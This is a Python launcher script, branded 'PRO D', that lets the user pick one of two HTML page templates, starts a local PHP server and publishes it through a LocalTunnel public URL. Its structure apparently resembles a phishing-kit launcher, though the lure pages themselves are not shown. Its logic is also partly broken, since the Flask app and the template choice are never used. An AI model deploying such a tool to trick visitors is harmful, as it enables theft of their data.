import os
import sys
import subprocess
import logging
import time

# -------- Auto-install modules if missing --------
def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    from flask import Flask, send_from_directory
except ModuleNotFoundError:
    print("Installing Flask...")
    install("flask")
    from flask import Flask, send_from_directory

# -------- Colors --------
red = '\033[1;31m'
grn = '\033[1;32m'
ylo = '\033[1;33m'
cyan = '\033[1;36m'
pink = '\033[1;35m'
reset = '\033[0m'

# -------- Suppress default Flask logs --------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{red}
██████╗ ██████╗  ██████╗     {cyan}██████╗ 
██╔══██╗██╔══██╗██╔═══██╗    {cyan}██╔══██╗
██████╔╝██████╔╝██║   ██║    {cyan}██████╔╝
██╔═══╝ ██╔═══╝ ██║   ██║    {cyan}██╔═══╝ 
██║     ██║     ╚██████╔╝    {cyan}██║     
╚═╝     ╚═╝      ╚═════╝     {cyan}╚═╝     
{reset}""")
    print(f"{pink}══════════════════════════════════════{reset}")
    print(f"{ylo} PRO D  |  Made by Dhani")
    print(f"{pink}══════════════════════════════════════{reset}\n")

# -------- Flask App --------
app = Flask(__name__)
selected_html = "1.html"  # default HTML file

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

# -------- Start PHP server in background --------
def start_php_server():
    print(f"{grn}Starting PHP server on http://127.0.0.1:8080 ...{reset}")
    if os.name == "nt":  # Windows
        subprocess.Popen(["php", "-S", "127.0.0.1:8080"], shell=True)
    else:  # Linux / Termux / Mac
        subprocess.Popen(["php", "-S", "127.0.0.1:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# -------- Start LocalTunnel and get public URL --------
def start_localtunnel():
    print(f"{grn}Starting LocalTunnel to get public URL...{reset}")
    process = subprocess.Popen(
        ["lt", "--port", "8080"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    public_url = None
    while True:
        line = process.stdout.readline()
        if not line:
            break
        if "https://" in line:
            public_url = line.strip()
            break

    if public_url:
        print(f"""{grn}
╔═══════════════════════════════════╗
║ {cyan}SERVER RUNNING...               {grn}║
╠═══════════════════════════════════╣
║ {ylo}Local: http://127.0.0.1:8080       {grn}║
║ {ylo}Public: {public_url}       {grn}║
╚═══════════════════════════════════╝
{reset}""")
    else:
        print(f"{red}Failed to get public URL from LocalTunnel.{reset}")

# -------- Main --------
if __name__ == "__main__":
    banner()

    # Choose template
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Page Template{pink}        ║
╠══════════════════════════════╣
║ [1] Page One                  ║
║ [2] Page Two                  ║
╚══════════════════════════════╝
{reset}""")
    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "1.html" if choice == "1" else "2.html"

    # Start PHP server and LocalTunnel
    start_php_server()
    time.sleep(2)  # give server time to start
    start_localtunnel()
